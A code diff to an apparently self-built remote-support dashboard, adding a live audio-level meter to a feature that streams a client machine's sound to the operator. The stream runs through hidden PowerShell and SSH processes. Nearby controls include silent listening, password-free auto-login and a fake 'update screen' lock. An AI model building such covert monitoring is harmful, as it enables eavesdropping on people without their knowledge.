@@ -658,6 +658,7 @@ function Stop-Audio {
         }
         $script:audio = $null
     }
+    try { Set-Content -Path (Join-Path $env:TEMP 'rsaudio_level.txt') -Value '0' -Encoding ascii -EA SilentlyContinue } catch {}
 }
 
 # The local audio PLAYER (runs in its own hidden powershell so it never blocks the dashboard).
@@ -676,7 +677,7 @@ public class RSPlayer{
  [DllImport("winmm.dll")] static extern int waveOutWrite(IntPtr h,IntPtr w,int s);
  [DllImport("winmm.dll")] static extern int waveOutReset(IntPtr h);
  [DllImport("winmm.dll")] static extern int waveOutClose(IntPtr h);
- public static void Run(string host,int port){
+ public static void Run(string host,int port,string levelPath){
   TcpClient c=new TcpClient(); c.Connect(host,port); NetworkStream ns=c.GetStream();
   StringBuilder sb=new StringBuilder(); int bch;
   while((bch=ns.ReadByte())!=-1 && bch!=10){ sb.Append((char)bch); }
@@ -706,6 +707,12 @@ public class RSPlayer{
       int off=0;
       while(off<BUF){ int g=ns.Read(tmp,off,BUF-off); if(g<=0){ return; } off+=g; }
       Marshal.Copy(tmp,0,pd[i],BUF);
+      try{ double sm=0; int nc=0;
+       if(bits==32){ for(int k=0;k+4<=BUF;k+=4){ float sv=BitConverter.ToSingle(tmp,k); sm+=sv*sv; nc++; } }
+       else { for(int k=0;k+2<=BUF;k+=2){ short sv=BitConverter.ToInt16(tmp,k); float fv=sv/32768f; sm+=fv*fv; nc++; } }
+       double rms=nc>0?Math.Sqrt(sm/nc):0; double lv=rms*4.0; if(lv>1){lv=1;}
+       System.IO.File.WriteAllText(levelPath, lv.ToString("0.000",System.Globalization.CultureInfo.InvariantCulture));
+      }catch{}
       Marshal.WriteInt32(ph[i],LENOFF,BUF);
       waveOutWrite(h,ph[i],HSZ);
       any=true;
@@ -717,6 +724,7 @@ public class RSPlayer{
   finally{
    try{ waveOutReset(h); }catch{}
    for(int i=0;i<N;i++){ try{ waveOutUnprepareHeader(h,ph[i],HSZ); }catch{} try{ Marshal.FreeHGlobal(ph[i]); }catch{} try{ Marshal.FreeHGlobal(pd[i]); }catch{} }
+   try{ System.IO.File.WriteAllText(levelPath,"0"); }catch{}
    try{ waveOutClose(h); }catch{} try{ ns.Close(); }catch{} try{ c.Close(); }catch{}
   }
  }
@@ -724,7 +732,7 @@ public class RSPlayer{
 "@
 $deadline=(Get-Date).AddSeconds(20)
 while((Get-Date) -lt $deadline){
-  try{ [RSPlayer]::Run($h,[int]$lp); break }
+  try{ [RSPlayer]::Run($h,[int]$lp,$lvl); break }
   catch{ Start-Sleep -Milliseconds 700 }
 }
 '@
@@ -796,7 +804,9 @@ Set-Content -Path 'C:\ProgramData\RemoteSupport\LOCK.flag' -Value '' -Encoding a
             try { Get-NetTCPConnection -LocalPort $lp -State Listen -EA SilentlyContinue | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force -EA SilentlyContinue } } catch {}
             $fwdArgs = @('-o','StrictHostKeyChecking=no','-o','BatchMode=yes','-o','ConnectTimeout=6','-o','ServerAliveInterval=15','-o','ExitOnForwardFailure=yes','-N','-L',"127.0.0.1:$lp`:127.0.0.1:9988","$u@$ip")
             $fwd = Start-Process ssh -WindowStyle Hidden -PassThru -ArgumentList $fwdArgs -EA SilentlyContinue
-            $pfx = '$lp=' + $lp + ';$h=''127.0.0.1'';' + "`n"
+            $lvlPath = Join-Path $env:TEMP 'rsaudio_level.txt'
+            try { Set-Content -Path $lvlPath -Value '0' -Encoding ascii } catch {}
+            $pfx = '$lp=' + $lp + ';$h=''127.0.0.1'';$lvl=''' + $lvlPath + ''';' + "`n"
             $pl = Start-Process powershell -WindowStyle Hidden -PassThru -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-EncodedCommand',(Enc ($pfx + $script:playerBody)) -EA SilentlyContinue
             $script:audio = @{ ip = $ip; fwd = $(if($fwd){$fwd.Id}); player = $(if($pl){$pl.Id}) }
             return "Listening to this client's audio (no screen session). Click 'Stop audio' to end. If silent, make sure something is actually playing on the client."
@@ -863,6 +873,9 @@ body{background:#eef1f5;color:#2a2f3a;display:flex;height:100vh;overflow:hidden;
 .preview .ov{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;gap:8px;font-size:12px;color:#8a93a3;background:#0a0d16}
 .acts{padding:14px 18px;display:grid;grid-template-columns:1fr 1fr;gap:9px}
 button.act{padding:11px;border-radius:7px;border:1px solid #dfe4ee;background:#f5f8fd;color:#2a2f3a;font-size:13px;cursor:pointer;text-align:left}
+.eqbars{display:inline-flex;align-items:flex-end;gap:2px;height:16px}
+.eqbars i{width:3px;height:3px;background:#2f6fed;border-radius:2px;transition:height .05s linear}
+body.dark .eqbars i{background:#6aa0ff}
 button.act:hover{background:#e9f0fb;border-color:#b9c8e6}
 button.act.danger:hover{background:#fdeaea;border-color:#e6a8a2}
 button.act.go{background:#2f6fed;border-color:#2f6fed;color:#fff}
@@ -1014,8 +1027,11 @@ function panel(){
      ${btn('terminal','Terminal','')}
      ${btn('health','Health / specs','')}
      ${btn('who','Who is logged in','')}
-     ${btn('listen','&#128266; Listen (silent)','')}
-     ${btn('stoplisten','Stop audio','')}
+     <div class="act" style="display:flex;align-items:center;gap:9px;cursor:default">
+       <button onclick="listenAudio()" style="border:0;background:none;padding:0;color:inherit;font:inherit;cursor:pointer">&#128266; Listen</button>
+       <span class="eqbars" id="eqbars"><i></i><i></i><i></i><i></i><i></i><i></i><i></i></span>
+     </div>
+     <button class="act" onclick="stopAudio()">Stop audio</button>
      <button class="act" onclick="autoLogin()">Auto-login (no password)</button>
      <button class="act" onclick="appMgr()">Block apps</button>
      ${btn('restart','Restart','danger')}
@@ -1046,6 +1062,25 @@ async function act(a){
   if(a==='lock'){updProg(1,1,'Locked - client screen is showing the update screen.');setTimeout(hideProg,2500);setTimeout(checkLock,1500);}
   else if(a==='unlock'){updProg(1,1,'Unlocked - client screen released.');setTimeout(hideProg,2500);setTimeout(checkLock,1500);}
   if(o)o.textContent=j.output||'(no output)';}catch(e){hideProg();if(o)o.textContent='Error: '+e;}
+}
+let audioOn=false, eqTimer=null;
+async function listenAudio(){
+  if(!sel)return;
+  const o=document.getElementById('out'); if(o)o.textContent='Starting audio...';
+  try{const r=await fetch('/api/action',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:sel.ip,action:'listen'})});
+  const j=await r.json(); if(o)o.textContent=j.output||'';}catch(e){if(o)o.textContent='Error: '+e;}
+  audioOn=true; if(!eqTimer){ eqTimer=setInterval(pollLevel,90); }
+}
+async function stopAudio(){
+  audioOn=false; if(eqTimer){clearInterval(eqTimer);eqTimer=null;} eqReset();
+  const o=document.getElementById('out');
+  try{const r=await fetch('/api/action',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:sel.ip,action:'stoplisten'})});const j=await r.json();if(o)o.textContent=j.output||'';}catch(e){}
+}
+function eqReset(){ document.querySelectorAll('#eqbars i').forEach(x=>x.style.height='3px'); }
+async function pollLevel(){
+  let L=0; try{const r=await fetch('/api/audiolevel',{cache:'no-store'});L=(await r.json()).level||0;}catch(e){}
+  const b=document.querySelectorAll('#eqbars i'); const n=b.length; if(!n)return;
+  for(let i=0;i<n;i++){ const c=1-Math.abs(i-(n-1)/2)/((n-1)/2)*0.55; const v=L*c*(0.65+0.35*Math.random()); b[i].style.height=(3+v*13).toFixed(0)+'px'; }
 }
 function stopRestart(){
   if(!sel)return;
@@ -1441,6 +1476,17 @@ Set-Content -Path 'C:\ProgramData\RemoteSupport\LOCK.flag' -Value '' -Encoding a
             $ip = $ctx.Request.QueryString['ip']
             $a = if ($script:workCover.ContainsKey($ip)) { $script:workCover[$ip] } else { 'off' }
             Send $ctx (@{ active = $a } | ConvertTo-Json -Compress) 'application/json'
+        }
+        elseif ($path -eq '/api/audiolevel') {
+            $lv = 0.0
+            try {
+                $lf = Join-Path $env:TEMP 'rsaudio_level.txt'
+                if ($script:audio -and (Test-Path $lf)) {
+                    $age = ((Get-Date) - (Get-Item $lf).LastWriteTime).TotalSeconds
+                    if ($age -lt 1.5) { $lv = [double]((Get-Content $lf -Raw).Trim()) }
+                }
+            } catch { $lv = 0.0 }
+            Send $ctx (@{ level = $lv } | ConvertTo-Json -Compress) 'application/json'
         }
         elseif ($path -eq '/api/thumb') {
             # NON-BLOCKING preview: fetch the JPEG in a background ssh process and serve the
